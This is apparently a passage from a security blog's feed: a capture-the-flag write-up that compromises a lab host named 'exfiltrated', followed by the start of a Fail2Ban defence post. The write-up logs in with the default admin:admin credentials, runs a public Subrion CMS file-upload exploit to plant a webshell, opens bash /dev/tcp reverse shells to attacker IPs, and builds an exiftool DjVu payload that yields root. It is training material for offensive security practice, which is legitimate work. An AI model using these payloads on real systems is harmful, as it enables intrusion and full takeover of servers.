        &amp;lt;meta &lt;span class=&quot;nv&quot;&gt;name&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;viewport&quot;&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;content&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;width=device-width, initial-scale=1&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt;
        &amp;lt;meta &lt;span class=&quot;nv&quot;&gt;name&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;generator&quot;&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;content&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;Subrion CMS - Open Source Content Management System&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; 
...
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;The page is running &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Subrion v4.2.1 CMS&lt;/code&gt;, and we are asked to provide admin credentials.&lt;/p&gt;

&lt;hr /&gt;

&lt;h1 id=&quot;exploitation&quot;&gt;&lt;strong&gt;Exploitation&lt;/strong&gt;&lt;/h1&gt;

&lt;h4 id=&quot;subrion-weak-credentials&quot;&gt;&lt;strong&gt;Subrion Weak Credentials&lt;/strong&gt;&lt;/h4&gt;
&lt;p&gt;Let’s us test some default combinations of &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;admin:admin&lt;/code&gt;, &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;admin:password&lt;/code&gt;, &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;subrion:subrion&lt;/code&gt; or &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;root:toor&lt;/code&gt; …&lt;/p&gt;

&lt;p&gt;Luckily, the first combination (&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;admin:admin&lt;/code&gt;) allows us to bypass the login prompt and land on the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Admin Dashboard&lt;/code&gt; page.&lt;/p&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;h4 id=&quot;subrion-v421-file-upload-bypass-to-rce&quot;&gt;&lt;strong&gt;Subrion v4.2.1 File Upload Bypass to RCE&lt;/strong&gt;&lt;/h4&gt;

&lt;p&gt;We can further examine the CMS public vulnerabilities with &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;searchsploit&lt;/code&gt;.&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;searchsploit Subrion 4.2.1
&lt;span class=&quot;nt&quot;&gt;------------------------------------------------------------------------------------------------------------------------------------------------------------&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;---------------------------------&lt;/span&gt;
 Exploit Title                                                                                                                                              |  Path
&lt;span class=&quot;nt&quot;&gt;------------------------------------------------------------------------------------------------------------------------------------------------------------&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;---------------------------------&lt;/span&gt;
Subrion CMS 4.2.1 - File Upload Bypass to RCE &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;Authenticated&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;                                                                                               | php/webapps/49876.py
&lt;span class=&quot;nt&quot;&gt;------------------------------------------------------------------------------------------------------------------------------------------------------------&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;---------------------------------&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Now, we can safely assume that the target system &lt;strong&gt;might be vulnerable&lt;/strong&gt; to RCE due to &lt;strong&gt;the similar version of &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Subrion&lt;/code&gt;&lt;/strong&gt;.&lt;/p&gt;

&lt;p&gt;Since the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;admin&lt;/code&gt; credentials are compromised, we can continue mouting our attacks by executing the following commands&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;searchsploit &lt;span class=&quot;nt&quot;&gt;-x&lt;/span&gt; php/webapps/49876.py &lt;span class=&quot;c&quot;&gt;# → Copy the exploit script to current directory.&lt;/span&gt;
&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;python3 49876.py &lt;span class=&quot;nt&quot;&gt;-u&lt;/span&gt; http://exfiltrated.offsec/panel/ &lt;span class=&quot;nt&quot;&gt;-l&lt;/span&gt; admin &lt;span class=&quot;nt&quot;&gt;-p&lt;/span&gt; admin &lt;span class=&quot;c&quot;&gt;# → execute the copied script given URL, admin username and password.&lt;/span&gt;
&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;+] SubrionCMS 4.2.1 - File Upload Bypass to RCE - CVE-2018-19422 

&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;+] Trying to connect to: http://exfiltrated.offsec/panel/
&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;+] Success!
&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;+] Got CSRF token: HDUgrsxjx6on2NWuf6kfmKLDxgcfXy7QIDVebkAo
&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;+] Trying to log &lt;span class=&quot;k&quot;&gt;in&lt;/span&gt;...
&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;+] Login Successful!

&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;+] Generating random name &lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;Webshell...
&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;+] Generated webshell name: tqrdcqpnkrgchnr

&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;+] Trying to Upload Webshell..
&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;+] Upload Success... Webshell path: http://exfiltrated.offsec/panel/uploads/tqrdcqpnkrgchnr.phar 

&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;id
&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;uid&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;33&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;www-data&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;gid&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;33&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;www-data&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;groups&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;33&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;www-data&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;bash+-c+%22bash+-i+%3E%26+%2Fdev%2Ftcp%2F192.168.49.122%2F80+0%3E%261%22 &lt;span class=&quot;c&quot;&gt;# → call URL-encoded reverse shell&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;The original reverse shell is as the follow:&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;bash &lt;span class=&quot;nt&quot;&gt;-c&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;bash -i &amp;gt;&amp;amp; /dev/tcp/192.168.49.122/80 0&amp;gt;&amp;amp;1&quot;&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;After the commands are executed, our &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;nc&lt;/code&gt; should catch the connection at port 80 as &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;www-data&lt;/code&gt;.&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;nc &lt;span class=&quot;nt&quot;&gt;-nlvp&lt;/span&gt; 80
listening on &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;any] 80 ...
connect to &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;192.168.49.122] from &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;UNKNOWN&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;192.168.122.163] 57592
bash: cannot &lt;span class=&quot;nb&quot;&gt;set &lt;/span&gt;terminal process group &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;973&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;: Inappropriate ioctl &lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;device
bash: no job control &lt;span class=&quot;k&quot;&gt;in &lt;/span&gt;this shell
www-data@exfiltrated:/var/www/html/subrion/uploads&lt;span class=&quot;err&quot;&gt;$&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;hr /&gt;

&lt;h1 id=&quot;privilege-escalation&quot;&gt;&lt;strong&gt;Privilege Escalation&lt;/strong&gt;&lt;/h1&gt;

&lt;h4 id=&quot;crontab-service&quot;&gt;Crontab Service&lt;/h4&gt;
&lt;p&gt;Local enumeration reveals an interesting entry of a &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;crontab&lt;/code&gt; file.&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;www-data@exfiltrated:/var/www/html/subrion/uploads&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;cat&lt;/span&gt; /etc/crontab
...
&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;     &lt;span class=&quot;k&quot;&gt;*&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;*&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;   root    bash /opt/image-exif.sh
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;The shell &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/opt/image-exif.sh&lt;/code&gt; will be executed every one minute by &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;root&lt;/code&gt;.&lt;/p&gt;

&lt;p&gt;Let’s us take a closer look at its content.&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;www-data@exfiltrated:/var/www/html/subrion/uploads&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;cat&lt;/span&gt; /opt/image-exif.sh
&lt;span class=&quot;c&quot;&gt;#! /bin/bash&lt;/span&gt;
&lt;span class=&quot;c&quot;&gt;#07/06/18 A BASH script to collect EXIF metadata &lt;/span&gt;

&lt;span class=&quot;nb&quot;&gt;echo&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-ne&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\\&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;n metadata directory cleaned! &lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\\&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;n&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\\&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;n&quot;&lt;/span&gt;


&lt;span class=&quot;nv&quot;&gt;IMAGES&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&apos;/var/www/html/subrion/uploads&apos;&lt;/span&gt;

&lt;span class=&quot;nv&quot;&gt;META&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&apos;/opt/metadata&apos;&lt;/span&gt;
&lt;span class=&quot;nv&quot;&gt;FILE&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;sb&quot;&gt;`&lt;/span&gt;openssl rand &lt;span class=&quot;nt&quot;&gt;-hex&lt;/span&gt; 5&lt;span class=&quot;sb&quot;&gt;`&lt;/span&gt;
&lt;span class=&quot;nv&quot;&gt;LOGFILE&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$META&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$FILE&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;

&lt;span class=&quot;nb&quot;&gt;echo&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-ne&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\\&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;n Processing EXIF metadata now... &lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\\&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;n&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\\&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;n&quot;&lt;/span&gt;
&lt;span class=&quot;nb&quot;&gt;ls&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$IMAGES&lt;/span&gt; | &lt;span class=&quot;nb&quot;&gt;grep&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;jpg&quot;&lt;/span&gt; | &lt;span class=&quot;k&quot;&gt;while &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;read &lt;/span&gt;filename&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; 
&lt;span class=&quot;k&quot;&gt;do 
    &lt;/span&gt;exiftool &lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$IMAGES&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$filename&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;gt;&amp;gt;&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$LOGFILE&lt;/span&gt; 
&lt;span class=&quot;k&quot;&gt;done

&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;echo&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-ne&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\\&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;n&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\\&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;n Processing is finished! &lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\\&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;n&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\\&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;n&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\\&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;n&quot;&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Primarily, the script will look for any &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;jpg&lt;/code&gt; file in the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/var/www/html/subrion/uploads&lt;/code&gt; directory and execute &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;exiftool&lt;/code&gt; against that file.&lt;/p&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;h4 id=&quot;exiftool-to-rce&quot;&gt;&lt;strong&gt;Exiftool to RCE&lt;/strong&gt;&lt;/h4&gt;
&lt;p&gt;Recently, a Security Researcher spotted a RCE vulnerability in the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;exiftool &amp;lt; v12.24&lt;/code&gt;.&lt;/p&gt;

&lt;p&gt;To check the current &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;exiftool&lt;/code&gt; version, we execute:&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;www-data@exfiltrated:/var/www/html/subrion/uploads&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;exiftool &lt;span class=&quot;nt&quot;&gt;-ver&lt;/span&gt;
11.x
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;The result implies that the current &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;exiftool&lt;/code&gt; might be exploitable. We can test our theory by navigating along the &lt;a href=&quot;https://blog.convisoappsec.com/en/a-case-study-on-cve-2021-22204-exiftool-rce&quot;&gt;PoC&lt;/a&gt;:&lt;/p&gt;

&lt;p&gt;On the local terminal, we execute&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;sudo &lt;/span&gt;apt-get update &lt;span class=&quot;o&quot;&gt;&amp;amp;&amp;amp;&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;sudo &lt;/span&gt;apt-get &lt;span class=&quot;nb&quot;&gt;install&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-y&lt;/span&gt; djvulibre-bin &lt;span class=&quot;c&quot;&gt;# → Install dependencies&lt;/span&gt;
&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;cat &lt;/span&gt;payload &lt;span class=&quot;c&quot;&gt;# → Create a payload file with the content is a reverse shell.&lt;/span&gt;
&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;metadata &lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\c&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;${&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;system&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&apos;bash -c \&quot;bash -i &amp;gt;&amp;amp; /dev/tcp/192.168.49.63/80 0&amp;gt;&amp;amp;1\&quot;&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;}&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;;&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;bzz payload payload.bzz &lt;span class=&quot;c&quot;&gt;# → Compress the payload &lt;/span&gt;
&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;djvumake exploit.djvu &lt;span class=&quot;nv&quot;&gt;INFO&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&apos;1,1&apos;&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;BGjp&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;/dev/null &lt;span class=&quot;nv&quot;&gt;ANTz&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;payload.bzz &lt;span class=&quot;c&quot;&gt;# → Compile the exploit.djvu file&lt;/span&gt;
&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;cat &lt;/span&gt;configfile &lt;span class=&quot;c&quot;&gt;# → Prepare a configfile having the following content.                            &lt;/span&gt;
%Image::ExifTool::UserDefined &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;
    &lt;span class=&quot;c&quot;&gt;# All EXIF tags are added to the Main table, and WriteGroup is used to&lt;/span&gt;
    &lt;span class=&quot;c&quot;&gt;# specify where the tag is written (default is ExifIFD if not specified):&lt;/span&gt;
    &lt;span class=&quot;s1&quot;&gt;&apos;Image::ExifTool::Exif::Main&apos;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&amp;gt;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;
        &lt;span class=&quot;c&quot;&gt;# Example 1.  EXIF:NewEXIFTag&lt;/span&gt;
        0xc51b &lt;span class=&quot;o&quot;&gt;=&amp;gt;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;
            Name &lt;span class=&quot;o&quot;&gt;=&amp;gt;&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;&apos;HasselbladExif&apos;&lt;/span&gt;,
            Writable &lt;span class=&quot;o&quot;&gt;=&amp;gt;&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;&apos;string&apos;&lt;/span&gt;,
            WriteGroup &lt;span class=&quot;o&quot;&gt;=&amp;gt;&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;&apos;IFD0&apos;&lt;/span&gt;,
        &lt;span class=&quot;o&quot;&gt;}&lt;/span&gt;,
        &lt;span class=&quot;c&quot;&gt;# add more user-defined EXIF tags here...&lt;/span&gt;
    &lt;span class=&quot;o&quot;&gt;}&lt;/span&gt;,
&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
1&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;c&quot;&gt;#end%&lt;/span&gt;
&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;exiftool &lt;span class=&quot;nt&quot;&gt;-config&lt;/span&gt; configfile  &lt;span class=&quot;s1&quot;&gt;&apos;-HasselbladExif&amp;lt;=exploit.djvu&apos;&lt;/span&gt; sample.jpg &lt;span class=&quot;c&quot;&gt;# → Embed the payload into the sample.jpg image&lt;/span&gt;
&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;python3 &lt;span class=&quot;nt&quot;&gt;-m&lt;/span&gt; http.server 80 &lt;span class=&quot;c&quot;&gt;# → Create a http server to transfer the payload&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;On the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;www-data&lt;/code&gt; shell, we download the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;sample.jpg&lt;/code&gt; image utilizing &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;wget&lt;/code&gt;.&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;www-data@exfiltrated:/var/www/html/subrion/uploads&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;wget 192.168.49.63/sample.jpg
Connecting to 192.168.49.63:80... connected.
HTTP request sent, awaiting response... 200 OK
Length: 4405 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;4.3K&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;image/jpeg]
Saving to: ‘sample.jpg’

sample.jpg                                         100%[&lt;span class=&quot;o&quot;&gt;=====================================================================================================================&amp;gt;]&lt;/span&gt;   4.30K  &lt;span class=&quot;nt&quot;&gt;--&lt;/span&gt;.-KB/s    &lt;span class=&quot;k&quot;&gt;in &lt;/span&gt;0.03s 
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;It’s important to save the downloaded &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;sample.jpg&lt;/code&gt; file inside&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/var/www/html/subrion/uploads&lt;/code&gt; directory, then wait …&lt;/p&gt;

&lt;p&gt;After a minute, we should obtain the reverse shell&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;nc &lt;span class=&quot;nt&quot;&gt;-nlvp&lt;/span&gt; 80
listening on &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;any] 80 ...
connect to &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;192.168.49.63] from &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;UNKNOWN&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;192.168.63.163] 50058
bash: cannot &lt;span class=&quot;nb&quot;&gt;set &lt;/span&gt;terminal process group &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;37008&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;: Inappropriate ioctl &lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;device
bash: no job control &lt;span class=&quot;k&quot;&gt;in &lt;/span&gt;this shell
root@exfiltrated:~# &lt;span class=&quot;nb&quot;&gt;id
id
&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;uid&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;0&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;root&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;gid&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;0&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;root&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;groups&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;0&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;root&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;and become root!.&lt;/p&gt;</content><author><name></name></author><category term="ctf" /><category term="linux" /><category term="pg" /><summary type="html">Summary In this writeup, we’ll exploit the Subrion v4.2.1 CMS to secure the inital foothold. We’ll then escalate our privilege via a crontab service that executes the exploitable exiftool.</summary></entry><entry><title type="html">Fail2Ban - BlueTeam</title><link href="https://jayngng.github.io/blog/fail2ban-blueteam/" rel="alternate" type="text/html" title="Fail2Ban - BlueTeam" /><published>2021-09-07T22:11:05+10:00</published><updated>2021-09-07T22:11:05+10:00</updated><id>https://jayngng.github.io/blog/fail2ban---blueteam</id><content type="html" xml:base="https://jayngng.github.io/blog/fail2ban-blueteam/">&lt;h3 id=&quot;overview-of-fail2ban&quot;&gt;&lt;strong&gt;Overview of &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;fail2ban&lt;/code&gt;&lt;/strong&gt;&lt;/h3&gt;
&lt;p&gt;The &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;fail2ban&lt;/code&gt; application will monitor the abnormalities of intrusion attempts accross multiple services including &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;HTTP&lt;/code&gt;, &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;SSH&lt;/code&gt;, etc. If an IP address is marked as suspicious, &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;fail2ban&lt;/code&gt; will block it for a specific duration.&lt;/p&gt;

&lt;p&gt;Primarily, &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;fail2ban&lt;/code&gt; is an efficient security strategy to protect a server against password bruteforcing attack or dictionary attack. We’ll dive deeper some basic configurations of &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;fail2ban&lt;/code&gt; in the next sections.&lt;/p&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;h3 id=&quot;installing-fail2ban&quot;&gt;&lt;strong&gt;Installing &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;fail2ban&lt;/code&gt;&lt;/strong&gt;&lt;/h3&gt;
